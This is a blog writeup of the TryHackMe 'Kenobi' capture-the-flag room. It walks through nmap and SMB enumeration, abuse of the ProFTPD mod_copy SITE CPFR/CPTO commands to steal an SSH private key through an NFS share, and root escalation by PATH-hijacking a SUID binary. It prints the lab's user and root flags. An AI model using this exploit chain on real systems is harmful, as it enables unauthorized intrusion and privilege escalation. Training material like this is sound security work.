---
date: 8/8/2025 00.00
layout: post
title: Kenobi
subtitle: Kenobi for TyHackMe Writeup.
description: in this blog i've explained how to root Kenobi from TryHackMe
image: https://tryhackme-images.s3.amazonaws.com/room-icons/46f437a95b1de43238c290a9c416c8d4.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/46f437a95b1de43238c290a9c416c8d4.png
category: tryhackme
tags:
  - tryhackme
  - injection
author: Mustafa Altayeb
paginate: true
---


# Room Name [Kenobi](https://tryhackme.com/room/kenobi# "Kenobi")


![](https://i.imgur.com/OcA2KrK.gif)

This room [Kenobi On TryHackMe] will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

----

# Objective of room

This room will cover 
1. Accessing a Samba share
2. Manipulating a vulnerable version of proftpd to gain initial access 
3. Escalate privileges to root via an SUID binary.

----

Nmap

----

## First Scan
>**nmap -p- --min-rate 10000 10.10.23.89**

Result

```js
üíª T4T4R1S üåê | Local IP ‚ûú 192.168.1.3 | ü•∑ VPN IP ‚ûú 10.11.139.85
üëÄ  ‚ûú ~ nmap -p- --min-rate 10000 10.10.23.89
Starting Nmap 7.94SVN 
Nmap scan report for 10.10.23.89
Host is up (0.12s latency).
Not shown: 53414 closed tcp ports (conn-refused), 12110 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
41569/tcp open  unknown
42817/tcp open  unknown
55365/tcp open  unknown
60229/tcp open  unknown
```
33 We got ssh on port 22 and ftp on port 21 and http on port 80 and rpcbind on port 111 and smbd on port 139 & 445
-----
## Advanced Scan
>**nmap -p 21,22,80,111,139,445 -sCV 10.10.23.89**

```js
nmap -p 21,22,80,111,139,445 -sCV 10.10.23.89 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-06 22:42 EEST
Nmap scan report for 10.10.23.89
Host is up (0.22s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34195/tcp6  mountd
|   100005  1,2,3      42817/tcp   mountd
|   100005  1,2,3      50095/udp   mountd
|   100005  1,2,3      51358/udp6  mountd
|   100021  1,3,4      41569/tcp   nlockmgr
|   100021  1,3,4      41977/tcp6  nlockmgr
|   100021  1,3,4      47268/udp   nlockmgr
|   100021  1,3,4      53911/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2025-08-06T14:42:29-05:00
| smb2-time: 
|   date: 2025-08-06T19:42:28
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

````
# SMB Enumeration

>**nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.194.61 **

```js
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.23.89\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.23.89\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.23.89\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>



```
We have 

```js
\\10.10.23.89\anonymous
```
## Try to connect with SMB via anonymous


>**smbclient //10.10.23.89/anonymous**

```js
üíª T4T4R1S üåê | Local IP ‚ûú 192.168.1.3 | ü•∑ VPN IP ‚ûú 10.11.139.85
üëÄ  ‚ûú ~ smbclient //10.10.23.89/anonymous
Password for [WORKGROUP\mustafa]:
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019
m
		9204224 blocks of size 1024. 6877104 blocks available
smb: \> mget log.txt
Get file log.txt? y
getting file \log.txt of size 12237 as log.txt (13.8 KiloBytes/sec) (average 13.8 KiloBytes/sec)
smb: \> 
```
----

## we get log.txt it has sensitive information 
path of ssh id_rsa &rarr; /home/kenobi/.ssh/id_rsa

# rpcbind Enumeration
we have rpcbind service running on port 111 

>**nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount**

```js
üíª T4T4R1S üåê | Local IP ‚ûú 192.168.1.3 | ü•∑ VPN IP ‚ûú 10.11.139.85
üëÄ  ‚ûú ~ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.23.89
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-06 22:54 EEST
Nmap scan report for 10.10.23.89
Host is up (0.10s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

```
-----

## We have var Directoy and know the FTP version ProFTPD 1.3.5 
Go to [exploit-db](http://https://www.exploit-db.com/ "exploit-db") and search for exploit or use Searchsploit

# Connect to FTP via nc on port 21

```js
telnet 10.10.194.61 21

```

>**now we will copy the ssh id_rsa from /home/kenobi/.ssh/id_rsa to /var/tmp/**

```js
telnet 10.10.194.61 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.194.61]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

```
go to folder /mnt

>**sudo mount -t nfs 10.10.23.89:/var /mnt**

```js

üíª T4T4R1S üåê | Local IP ‚ûú 192.168.1.3 | ü•∑ VPN IP ‚ûú 10.11.139.85
üëÄ  ‚ûú /mnt cd tmp
üíª T4T4R1S üåê | Local IP ‚ûú 192.168.1.3 | ü•∑ VPN IP ‚ûú 10.11.139.85
üëÄ  ‚ûú /mnt/tmp ls
id_rsa
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
systemd-private-b168a848f5f4485c97aa4dedc11c7c6e-systemd-timesyncd.service-iAn4C5
systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
üíª T4T4R1S üåê | Local IP ‚ûú 192.168.1.3 | ü•∑ VPN IP ‚ûú 10.11.139.85
üëÄ  ‚ûú /mnt/tmp chmod 600 id_rsa id_rsa id_rsa  
chmod: changing permissions of 'id_rsa': Read-only file system


```
>**Use id_rsa to connect to ssh**

```js
üíª T4T4R1S üåê | Local IP ‚ûú 192.168.1.3 | ü•∑ VPN IP ‚ûú 10.11.139.85
üëÄ  ‚ûú /mnt/tmp sudo ssh -i id_rsa kenobi@10.10.23.89
Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

-----


# Time for some privilege escalation 

----

## SUID 
(Set owner User ID up on execution) is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherits access permissions from the logged in user.


### Use 
 >**find / -type f -perm -u=s 2>/dev/null**
to search for files with a misconfigured SUID let us to get root privileges

```js
kenobi@kenobi:~$ find / -type f -perm -u=s 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$
```

## The /usr/bin/menu file looks intersest. Let's run this binary. we get this output with 3 options to select:

```js
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```
## In 1. status check like curl.
we make can file and name it as curl and copy /bin/bash to it then make it  readable, writeable and executable then add the path of curl file to bash shell of the system path

```js
kenobi@kenobi:/tmp$ echo /bin/bash > curl 
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

# Search for root flag

```js
root@kenobi:/# cd root
root@kenobi:/root# ls
root.txt
root@kenobi:/root# cat root.txt
177b3cd8562289f37382721c28381f02
root@kenobi:/root# 
```


<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>